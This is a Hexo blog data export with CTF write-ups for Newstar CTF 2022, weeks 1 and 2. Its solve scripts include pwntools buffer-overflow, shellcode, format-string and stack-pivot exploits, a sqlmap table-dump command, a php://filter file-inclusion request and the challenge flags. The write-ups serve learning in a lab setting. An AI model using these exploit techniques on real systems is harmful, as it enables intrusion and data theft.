{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"https://feverhu.github.io","root":"/"},"pages":[{"title":"tags","date":"2022-08-07T02:19:56.000Z","updated":"2022-08-07T06:44:55.870Z","comments":false,"path":"tags/index.html","permalink":"https://feverhu.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-08-07T03:29:10.627Z","updated":"2022-08-07T03:29:10.627Z","comments":true,"path":"links/index.html","permalink":"https://feverhu.github.io/links/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-08-07T06:33:49.000Z","updated":"2022-08-07T06:44:47.451Z","comments":false,"path":"categories/index.html","permalink":"https://feverhu.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Newstar-CTF-2022-week2","slug":"Newstar-CTF-2022-week2","date":"2022-11-07T14:15:04.000Z","updated":"2022-11-07T14:17:16.333Z","comments":true,"path":"2022/11/07/Newstar-CTF-2022-week2/","link":"","permalink":"https://feverhu.github.io/2022/11/07/Newstar-CTF-2022-week2/","excerpt":"","text":"Newstar Ctf 2022| week2 wpNewstar Ctf 2022第二周题目的wp。 Crypto unusual_base Affine robot ezPRNG ezRabin Misc Yesec no drumsticks 2 Coldwinds’s Desktop 奇怪的二维码 qsdz’s girlfriend 2 奇怪的波形 Pwn uint32 and ret shellcode-revenge 砍一刀 buffer-fly Reverse 前可见古人，后得见来者 FindME Petals ur_so_naive Likemyasp web Word-For-You(2 Gen) IncludeOne Cryptounusual_base shuffle()函数是把数组中的元素按随机顺序重新排列。 随机排列后的alphabet给出了，那就直接根据encoded += alphabet[int(bits[i:i+6], 2)]逆向出来就行了。 12345678910111213141516171819202122from Crypto.Util.number import *from random import shufflefrom string import ascii_lowercase, ascii_uppercase, digitsencoded = &quot;GjN3G$B3de58ym&amp;7wQh9dgVNGQhfG2hndsGjlOyEdaxRFY&quot;alphabet = &quot;c5PKAQmgI&amp;qSdyDZYCbOV2seXGloLwtFW3f9n7j481UMHBp6vNETRJa$rxuz0hik&quot;bits = &#x27;&#x27;for i in encoded: tmp = alphabet.find(i) print(tmp) bits += (bin(tmp)[2:].rjust(6,&#x27;0&#x27;))bits += &#x27;0000&#x27;flag = &#x27;&#x27;for i in range(0, 280, 8): tmp = int(bits[i:i + 8], 2) flag += (chr(tmp))print(flag)#flag&#123;a1ph4bet_c0u1d_be_d1ffi3r3nt&#125; Affine直接爆破吧 12345678910111213141516171819cipher = b&quot;\\xb1\\x83\\x82T\\x10\\x80\\xc9O\\x84\\xc9&lt;\\x0f\\xf2\\x82\\x9a\\xc9\\x9b8&#x27;\\x9b&lt;\\xdb\\x9b\\x9b\\x82\\xc8\\xe0V&quot;for a in range(2 ** 8): for b in range(2 ** 8): if cipher[0] == (a * ord(&#x27;f&#x27;) + b) % 0x100: if cipher[1] == (a * ord(&#x27;l&#x27;) + b) % 0x100: if cipher[2] == (a * ord(&#x27;a&#x27;) + b) % 0x100: print(a, b)a = 163b = 191flag = &#x27;&#x27;for i in range(len(cipher)): for j in range(33, 127): if (a * j + b) % 0x100 == cipher[i]: flag += chr(j)print(flag)#flag&#123;Kn0wn_p1aint3xt_4ttack&#125; robot 直接复制加密函数爆破，但是有随机数生成。那就多爆破两次： 123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *from hashlib import sha256import randomfrom base64 import *res = [&#x27;252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111&#x27;, 1495846, 1452754, b&#x27;M4======&#x27;, &#x27;021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96&#x27;, &#x27;2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6&#x27;, &#x27;4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a&#x27;, b&#x27;Tg==&#x27;, &#x27;1b16b1df538ba12dc3f97edbb85caa7050d46c148134290feba80f8236c83db9&#x27;, b&#x27;52304539505430395054303D&#x27;, &#x27;e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8&#x27;, b&#x27;58773D3D&#x27;, &#x27;3f39d5c348e5b79d06e842c114e6cc571583bbf44e4b0ebfda1a01ec05745d43&#x27;, &#x27;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&#x27;, &#x27;2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6&#x27;, b&#x27;T0k9PT09PT0=&#x27;, &#x27;18f5384d58bcb1bba0bcd9e6a6781d1a6ac2cc280c330ecbab6cb7931b721552&#x27;, b&#x27;T0E9PT09PT0=&#x27;, 825026, &#x27;d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde&#x27;, 1455816, b&#x27;4F553D3D3D3D3D3D&#x27;, 1165366, 1242964, b&#x27;4F493D3D3D3D3D3D&#x27;, 652094, 597296, &#x27;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&#x27;, &#x27;4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a&#x27;, b&#x27;54314539505430395054303D&#x27;, 1242964, 368664, b&#x27;TVU9PT09PT0=&#x27;, b&#x27;cw==&#x27;, 1602214]def fun1(x): return sha256(x.encode()).hexdigest()def fun2(x): return pow(114514,ord(x),1919810)def fun3(x): key = random.randint(0,1145141919810) ans = x.encode() if key &amp; 1: ans = b32encode(ans) key &gt;&gt;= 1 if key &amp; 1: ans = b64encode(ans) key &gt;&gt;= 1 if key &amp; 1: ans = b16encode(ans) key &gt;&gt;= 1 return ansfor count in range(5): flag = &#x27;&#x27; for i in range(len(res)): for j in range(33, 127): x = chr(j) if res[i] == fun1(x) or res[i] == fun2(x): flag += x break for k in range(20): if res[i] == fun3(x): flag += x break print(flag)#flag&#123;c4Nn0t_D3crYpt_buT_r3p34t_Yes&#125; ezPRNG大佬讲的很清楚嘞：线性同余生成器 有一点需要注意的，如果modinv函数不能够正常返回，那么需要更换crack_unknown_multiplier中states的参数。大佬博客里面是(2,1,1,0)。我这里是(3,2,2,1)。 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from Crypto.Util.number import *from functools import reducefrom functools import reducefrom math import gcdfrom Crypto.Util.number import *def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[3] - states[2]) * modinv(states[2] - states[1], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) print(modulus) return crack_unknown_multiplier(states, modulus)# N[i+1] = (A*N[i]+B) % M# A,B,N均未知hints = [32579077549265101609729134002322479188058664203229584246639330306875565342934, 30627296760863751873213598737521260410801961411772904859782399797798775242121, 59045755507520598673072877669036271379314362490837080079400207813316110037822, 29714794521560972198312794885289362350476307292503308718904661896314434077717, 3378007627369454232183998646610752441039379051735310926898417029172995488622, 35893579613746468714922176435597562302206699188445795487657524606666534642489]print(len(hintsezPRNG))sequence = hintsmodulus, multiplier, increment = crack_unknown_modulus(sequence)A = 6665518583654864024281280175260135044707462922029971254176205214742119570627B = 70647661941803021648890247705354664245937054339520114852905142734885854842787N = 121345174246418575181911383111384744844396268276674523949961216790284235179004e = inverse(A, N)flag = ((hints[0] - B) * e) % Nprint(long_to_bytes(flag)) ezRabin参考大佬的：Rabin密钥体制 1234567891011121314151617181920212223242526272829import gmpy2from Crypto.Util.number import *c= 59087040011818617875466940950576089096932769518087477304162753047334728508009365510335057824251636964132317478310267427589970177277870220660958570994888152191522928881774614096675980017700457666192609573774572571582962861504174396725705862549311100229145101667835438230371282904888448863223898642183925834109p= 10522889477508921233145726452630168129218487981917965097647277937267556441871668611904567713868254050044587941828674788953975031679913879970887998582514571q= 11287822338267163056031463255265099337492571870189068887689824393221951058498526362126606231275830844407608185240702408947800715624427717739233431252556379n = p * qdef attack(c): c1=pow(c,(p+1) // 4 , p) c2=pow(c,(q+1) // 4, q) cp1=p-c1 cp2=q-c2 t1=gmpy2.invert(p,q)#p的模q逆元 t2=gmpy2.invert(q,p)#q的模p逆元 m1=(q*c1*t2+p*c2*t1)%n m2=(q*c1*t2+p*cp2*t1)%n # or m2=n-m1 m3=(q*cp1*t2+p*c2*t1)%n m4=(q*cp1*t2+p*cp2*t1)%n # or m4=n-m3 m = [m1, m2, m3, m4] return mm = attack(c)for i in m: m_ = attack(i) for j in m_: print(long_to_bytes(j &gt;&gt; 300)) MiscYesec no drumsticks 2解密网站：零宽字节隐写 把文档输入decode框， Zero Width Characters for Steganography 选择默认如下： 得到： 186MygAZ2uJi2oCxctsd28LBNRXHPLykF5LBz8f1xEikWNVpKfpce2CMHvhSJUdk7CHLrEVhGRVQvMwT8r7JUgVWGbnzxb 这是base58。 123#666c61677b496e6772336431656e745f30465f59657365635f69355f4f4f4f4f4f7dflag = &#x27;666c61677b496e6772336431656e745f30465f59657365635f69355f4f4f4f4f4f7d&#x27;print(bytes.fromhex(flag)) Coldwinds’s Desktopmontage拼图，gaps排序。每个文件大小30*30的。 12345678#montage：apt-get install graphicsmagick-imagemagick-compat#gaps: https://github.com/nemanja-m/gaps#gaps安装有点难度。装不上可以搜一下。montage *.PNG -tile 16x9 -geometry +0+0 montage.png#注意这里的乘号是x。16x9是桌面比例。sudo gaps --image=montage.png --generation=30 --population=144 --save#我是wsl2的kali，所以加save才能看到输出。 奇怪的二维码这道题想了很久，过了两天才想起来咋做，网上搜下了阿兹台克码，果然是。 binwalk发现code.png内部还有个png，提取出来是帝国时代2中阿兹台克的介绍。于是搜索阿兹台克码。 用ps补全。阿兹台克码解码地址 qsdz’s girlfriend 2女朋友2这道题，仔细看里面的n,a,b。合在一起是arnold编码提示找到脚本: 123456789101112131415161718192021222324252627282930313233343536import cv2import numpy as npdef arnold_decode(image, shuffle_times, a, b): &quot;&quot;&quot; decode for rgb image that encoded by Arnold Args: image: rgb image encoded by Arnold shuffle_times: how many times to shuffle Returns: decode image &quot;&quot;&quot; # 1:创建新图像 decode_image = np.zeros(shape=image.shape,dtype=int) # 2：计算N h, w = image.shape[0], image.shape[1] N = h # 或N=w # 3：遍历像素坐标变换 for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): # 按照公式坐标变换 new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N new_y = ((-a) * ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] return decode_imageimg = cv2.imread(&quot;1.png&quot;) #变换的图片a = 0x726eb = 0x6f6c64st = 3pic = arnold_decode(img,st,a,b)cv2.imwrite(&#x27;i&#x27; + str(i) + &#x27;.png&#x27;,pic) #保存得到的图片#flag&#123;按理说这个点猪也该醒了&#125; 奇怪的波形这道题本来看不懂，但是出题人群里面提示了一下，秒懂。根据出题人意思，如果key[i] == 0，那么执行那么两个相邻的波峰形态都应该一样的，因为执行的代码相同。如果key[i] == 1，那么两个相邻波峰形态应该是不同的。 123456789101112131415161718for (i = 0; i &lt; 16; i++)&#123; tmp = S * S; S = tmp % N; if (key[i] == 1) &#123; tmp = S * m; S = tmp % N; &#125; else &#123; tmp = S * S; S = tmp % N; &#125;&#125;return m, S;#flag&#123;0010001001100111&#125; Pwnuint32 and ret 利用nbytes-v2来溢出，v2是%u格式，也就是无符号十进制数。 123456789101112from pwn import *#4294967224p = process(&#x27;./uint&#x27;)p.recvuntil(b&#x27;success!&#x27;)payload1 = str(4294967224).encode()p.sendline(payload1)backdoor = 0x4011B6ret = 0x40101apayload2 = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 0x8 + p64(ret) + p64(backdoor)p.sendline(payload2)p.interactive() 如果不加ret的话，应该会出现这种情况。 shellcode-revenge提示给的很好： 我要创造一个 read 字节数足够的世界 有两个输入，第一个输入只有0x1A个字符输入，构成不了可用的shellcode，输入地址是0x233000。所以，第一个read应该构造buf(0x233000)上面的shellcode，再实现一次read输入，这个用的长度比较短。第二个read构造栈溢出，使得return的地址执行0x233000上的shellcode。其他问题请看注释。 123456789101112131415161718192021222324252627from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)shellcode = shellcraft.read(0, 0x233019, 0x100)shellcode = asm(shellcode) + b&#x27;\\x90\\x90\\x90\\x90&#x27;#这是read语句的shellcode，在0x233019地址上输入0x100个字符。在第一个read的地方输入这个shellcode。#\\x90就是nop，这句不执行。如果没有这个\\x90需要计算shellcode的长度，以免覆盖错误，这几个增加了容错。code = shellcraft.open(&quot;flag&quot;)code += shellcraft.read(3, 0x233200, 0x50)code += shellcraft.write(1, 0x233200, 0x50)code = asm(code)#这是直接读取flag的内容。这个道题flag在程序目录下。作为第三个read的输入。backdoor = 0x233000p = process(&quot;./pwn&quot;)p.recvuntil(b&#x27;.&#x27;)p.sendline(shellcode)p.recvuntil(b&#x27;~&#x27;)payload = 0x30 * b&#x27;a&#x27; + 8 * b&#x27;b&#x27; + p64(backdoor)p.sendline(payload)p.recvuntil(b&#x27;!\\n&#x27;)p.sendline(code)p.interactive() 砍一刀这道题真实复刻了砍某厂商优惠的过程，做起来是挺蛋疼的。格式化字符串漏洞，附上大佬师傅讲解的地址：CTF pwn题之格式化字符串漏洞详解 。里面的payload很有用。不过后面还有一道题，可以更细致的讲讲，这道题做起来确实太烦了，主要是文字太多，我的wsl并不能识别中文，所以推荐去虚拟机实现。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)if __name__ == &quot;__main__&quot;: p = process(&#x27;./pwn&#x27;) #game print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) p.sendline(b&#x27;&#x27;) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) p.sendline(b&#x27;&#x27;) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) #cipher print(p.recvuntil(b&#x27;==&gt;&#x27;)) p.sendline(b&#x27;666&#x27;) #game print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) p.sendline(b&#x27;&#x27;) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) #getcard print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) while True: print(p.recvuntil(b&#x27;\\n&#x27;)) p.sendline(b&#x27;&#x27;) print(p.recvuntil(b&#x27;!&#x27;)) tmp = p.recvuntil(b&#x27;\\n&#x27;) if b&#x27;=&#x27; in tmp: break print(p.recvuntil(b&#x27;\\n\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(&quot;arrive getdiamond&quot;) #diamond print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n&#x27;)) print(p.recvuntil(b&#x27;\\n\\n&#x27;)) while True: tmp = p.recvuntil(b&#x27;\\n&#x27;) if b&#x27;=&#x27; in tmp: print(&quot;sucess!&quot;) break p.sendline(b&#x27;&#x27;) print(p.recvuntil(b&#x27;!&#x27;)) tmp = p.recvuntil(b&#x27;\\n&#x27;) if b&#x27;=&#x27; in tmp: print(p.recvuntil(b&quot;==&gt;&quot;)) payload = fmtstr_payload(8, &#123;0x404090:10&#125;) p.sendline(payload) p.interactive() buffer-fly buf并没有初始化，所以存在一些我们需要的值。 因为printf打印到\\x0，所以可以尝试把这两个地址上面的值泄露出来。程序基地址是0x55555555528b - 0x128b。rbp存储的地址是0x7fffffffdf40 - 0x10。最后一个read只有0x40个字符输入所以直接system地址并不够用。那么只能尝试下栈迁移。上大佬得讲解：栈迁移浅析 ： 我们知道程序在结束的时候本身就会执行一次leave ret如果我们把ebp换成我们想迁移的地址，那么在执行leava ret的时候首先会mov esp ebp;这时的esp会指向当前栈的基地址，再执行pop ebp，如果之前我们通过栈溢出将ebp改成了我们想要迁移的地址即bss段，这时执行完pop ebp;之后就会使得ebp指向bss段的地址。 这道题我们不需要bss段也能完成。 原理是覆盖ebp指向图中rsp上一个的地址。也就是0x7fffffffdf40 - 0x38。然后经过返回地址leave和ret后，我们eip指向了途中rsp的地址，0x7fffffffdf10。如果这时，写入的值为pop_rdi_ret, 0x7fffffffdf40，system_addr，就可以执行0x7fffffffdf40上我们输入的值了。最后这道题还有个坑，不能直接输出cat flag，所以可以用sh flag或者cat flag &gt;&amp;2。 12345678910111213141516171819202122232425262728293031from pwn import *context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)p = process(&#x27;./buffer_fly&#x27;)p.recvuntil(b&quot;give me your name: &quot;)p.send(b&#x27;a&#x27; * 0x18)p.recvuntil(b&#x27;a&#x27; * 0x18)program_leak = p.recvuntil(b&#x27;\\n&#x27;)[:-1]program_leak = u64(program_leak.ljust(8, b&#x27;\\x00&#x27;))program_base = program_leak - 0x00128bprint(hex(program_base))pop_rdi_ret = program_base + 0x001423system_addr = program_base + 0x0010E4leave_ret = program_base + 0x001397p.recvuntil(&quot;give me your age: &quot;)p.send(b&quot;a&quot; * 0x20)p.recvuntil(b&quot;a&quot; * 0x20)stack_leak = p.recvuntil(b&quot;\\n&quot;)[:-1]stack_leak = u64(stack_leak.ljust(8, b&#x27;\\x00&#x27;))print(hex(stack_leak))p.recvuntil(b&quot;you are a girl ?\\nsusu give me your wechat number: &quot;)cat_flag = b&quot;sh flag&quot; + b&#x27;\\x00&#x27;payload = p64(pop_rdi_ret) + p64(stack_leak) + p64(system_addr) + p64(0) + p64(stack_leak - 0x38) + p64(leave_ret) + cat_flagp.send(payload)p.interactive() Reverse前可见古人，后得见来者异或加凯撒： 1234567891011121314task = [0x51, 0x5B, 0x4C, 0x56, 0x59, 0x4D, 0x50, 0x56, 0x54, 0x43, 0x7D, 0x4C, 0x43, 0x53, 0x7D, 0x50, 0x43, 0x53, 0x7D, 0x47, 0x50, 0x7D, 0x4C, 0x43, 0x53, 0x7D, 0x4E, 0x40, 0x4A, 0x5F, 0x00]task = [i ^ 0x22 for i in task]flag = &#x27;&#x27;for i in task: if i &lt; 65 or i &gt; 90: if i &gt;= 97 and i &lt;= 122: flag += chr((i - 13 - 97) % 0x1A + 97) else: flag += chr(i) else: flag += chr((i - 13 -65) % 0x1A + 65)print(flag)#flag&#123;begin_and_end_re_and_you&#125; FindME这题是用angr直接秒的。 123456789101112131415161718192021222324252627282930#001D10import angrimport sysdef Go(): path_to_binary = &quot;task_time&quot; project = angr.Project(path_to_binary, auto_load_libs=False) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) #一般我会先查看程序起始地址，64位程序可能是0x400000，32位可能是0x800000 #print(project.entry) print_good_address = 0x401D10 simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) # 大概意思是dump出输入 print(solution) else: raise Exception(&#x27;Could not find the solution&#x27;)if __name__ == &quot;__main__&quot;: Go() #path_to_binary = &quot;oruga&quot; #project = angr.Project(path_to_binary, auto_load_libs=False) #print(project.entry)#b&#x27;flag&#123;D0nt_let_time_bo_so_cheap!&#125; Petals 这个地方有个花指令。在013B0处按u，然后ctrl+n。回到loc_1209按p。就可以F5了。然后直接逆就行。 12345678910111213141516171819cipher = [0xD0, 0xD0, 0x85, 0x85, 0x80, 0x80, 0xC5, 0x8A, 0x93, 0x89, 0x92, 0x8F, 0x87, 0x88, 0x9F, 0x8F, 0xC5, 0x84, 0xD6, 0xD1, 0xD2, 0x82, 0xD3, 0xDE, 0x87]v5 = [~(i ^ 25) &amp; 0xff for i in range(256)]print(v5)flag = &#x27;&#x27;for i in range(len(cipher)): for j in range(33, 127): tmp = chr(j) if v5[j] == cipher[i]: print(f&quot;i : %d - %c&quot; %(i,tmp)) flag += tmpprint(len(flag))print(flag)import hashlibmd5 = hashlib.md5()md5.update(flag.encode())print(md5.hexdigest()) ur_so_naiveexciting! 首先找到Activity。这里有疑似最后的加密结果this.o。还有个loadLibrary，那么从Libraries里面取出来libencry.so。 加密函数： 在原来的activity里面找到x1.a，打开，就可以看到逻辑了： 接着就是直接解了： 123456789101112131415161718192021222324252627282930final = [-36, 83, 22, -117, -103, -14, 8, 19, -47, 0x2F, -110, 71, 2, -21, -52, -36, 24, -121, 87, -114, -121, 27, -113, -86]v7 = list(b&#x27;FALL&#x27;)def ROR(byte_, num): tmp = (byte_ &gt;&gt; num) | (byte_ &lt;&lt; (8 - num)) &amp; 0xff return tmpdef ROL(byte_, num): tmp = (byte_ &lt;&lt; num &amp; 0xff) | (byte_ &gt;&gt; (8 - num)) return tmpdef test(a, c): v9 = ROR(a, 1) v10 = ROL((v7[0] ^ v9) &amp; 0xff, 6) v11 = ROL((v7[1] ^ v10) &amp; 0xff , 5) v12 = ROL((v7[2] ^ v11) &amp; 0xff, 4) v13 = (v12 ^ v7[3]) &amp; 0xff return v13 ^ cflag = [ord(&#x27;f&#x27;)]for i in range(len(final)): for j in range(33, 127): if test(flag[i], j) == final[i] % 256: flag.append(j) breakprint(bytes(flag))#b&#x27;flag&#123;n@1ve_luv_2you#ouo&#125;&#x27; Likemyasp这道题有个相似的脱壳介绍：x64dbg手脱壳 12345678910111213141516cipher = [0x98, 0xC0, 0x1F, 0x3C, 0x80, 0x0D, 0x00, 0x00, 0x97, 0xC0, 0x0B, 0x36, 0x20, 0x0E, 0x00, 0x00, 0xA0, 0x00, 0x1C, 0x2A, 0xE0, 0x0F, 0x00, 0x00, 0xCB, 0x40, 0x10, 0x12, 0xA0, 0x0F, 0x00, 0x00, 0x92, 0x40, 0x10, 0x32, 0x20, 0x0F, 0x00, 0x00, 0x82, 0x40, 0x88, 0x15, 0x60, 0x0D]tt = [0x0D803C1FC098, 0x0E20360BC097, 0x0FE02A1C00A0, 0x0FA0121040CB, 0x0F2032104092, 0x0D6015884082]flag = &#x27;&#x27;for i in tt: d = ~(i &amp; 0xff) c = ((i &gt;&gt; 14) &amp; 0xff) ^ 0x1E b = ((i &gt;&gt; 23) &amp; 0xff) ^ 0x14 a = ((i &gt;&gt; 37) &amp; 0xff) ^ 0xA #print(a , b, c, d % 256) flag += (chr(a) + chr(b) + chr(c) + chr(d % 256))print(flag)#flag&#123;x1hu@n_w0_4sp_ma??&#125; web我的web还很菜，这位师傅给了详细的wp：七校联合NewStarCTF 公开赛赛道WEEK2 web wp Word-For-You(2 Gen)sqlmap 1234567891011121314151617POST /comments.php HTTP/1.1Host: 90176c4f-e0a6-4c63-ae31-fa60d6e6a470.node4.buuoj.cn:81Content-Length: 6Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://90176c4f-e0a6-4c63-ae31-fa60d6e6a470.node4.buuoj.cn:81Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://90176c4f-e0a6-4c63-ae31-fa60d6e6a470.node4.buuoj.cn:81/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closename=1#post.txt 12sqlmap -r post.txt -D &#x27;wfy&#x27; -T &#x27;wfy_comments&#x27; --dump --level=5 --fresh-queries --delay 0.1 &gt; sqlmap.txt IncludeOne提示给了方法： 12345678&lt;?phpmt_srand(1145146);echo mt_rand();echo &#x27;\\n&#x27;;echo mt_rand();?&gt;#1219893521\\n1202031004 然后用rot13绕过一下就行 123456789101112131415POST /?file=php://filter/NewStar/read=string.rot13/resource=flag.php HTTP/1.1Host: df77d66c-2711-420c-9b08-702dd925b971.node4.buuoj.cn:81Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 16guess=1202031004","categories":[{"name":"match","slug":"match","permalink":"https://feverhu.github.io/categories/match/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://feverhu.github.io/tags/RSA/"},{"name":"php","slug":"php","permalink":"https://feverhu.github.io/tags/php/"},{"name":"python","slug":"python","permalink":"https://feverhu.github.io/tags/python/"}]},{"title":"Newstar CTF 2022 week1","slug":"Newstar-CTF-2022-week1","date":"2022-10-29T14:28:10.000Z","updated":"2022-10-29T14:57:07.311Z","comments":true,"path":"2022/10/29/Newstar-CTF-2022-week1/","link":"","permalink":"https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/","excerpt":"","text":"Newstar 2022 |week1 一个月的newstar比赛，提供了一次很好的入门机会，边学边做，提高了很多。在此感谢出题的师傅们。直到现在有时间整理下题目做法，开始陆续写写wp。我还专门注册了一个新号上去看看能不能参加，现在也行，给出题人和buu平台点个赞！ week1的题目比较简单，在此复现和记录一下。入口链接：https://buuoj.cn/match/matches/146 Crypto caeser 吉奥万·巴蒂斯塔·贝拉索先生的密码 easyxor RSA_begin chaos Misc Yesec no drumsticks 1 qsdz's girlfriend 1 Look my eyes EzSnake 奇怪的音频。 Pwn ret2text calc ret2libc ret2shellcode fallw1nd’s gift Reverse Hello_Reverse Baby_Re Pyre EasyRe 艾克体悟题 Web HTTP Head?Header! 我真的会谢 NotPHP Word-For-You Crypto caeser 去随波逐流一键解密。 吉奥万·巴蒂斯塔·贝拉索先生的密码 维吉尼亚解密：https://www.guballa.de/vigenere-solver easyxor 12345678910cipher = bytes.fromhex(&#x27;9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480&#x27;)print(cipher)x = ord(&#x27;f&#x27;) ^ 0x9bflag = &#x27;&#x27;for i in range(len(cipher)): flag += chr(cipher[i] ^ x)print(flag)#flag&#123;x0r_i5_qu1t3_3azy&#125; RSA_begin 这道题应该是本次密码最难的题目。 level5：卡住了，问了问大佬。 这样的话，\\(hint * e^e - 1\\)包含了\\(p\\)这个质因数，可以和n求最大公约数解出来\\(p\\)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from Crypto.Util.number import *from gmpy2 import *flag = b&#x27;&#x27;#Level 1:c = 22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905p = 6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351q = 9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163e = 0x10001d = inverse(e, (p - 1) * (q - 1))flag += long_to_bytes(pow(c, d, p * q))print(flag)#Level 2:c = 17250922799297131008803303235771955129n = 134097988095851988085603926250918812377p = 10094271714305059493q = 13284562957208247589e = 0x10001d = inverse(e, (p - 1) * (q - 1))flag += long_to_bytes(pow(c, d, p * q))print(flag)#Level 3:c = 2776571135646565181849912433877522437622755332262910824866791711n = 85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157flag += long_to_bytes(iroot(c, 3)[0])print(flag)#Level 4:c = 68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191e = 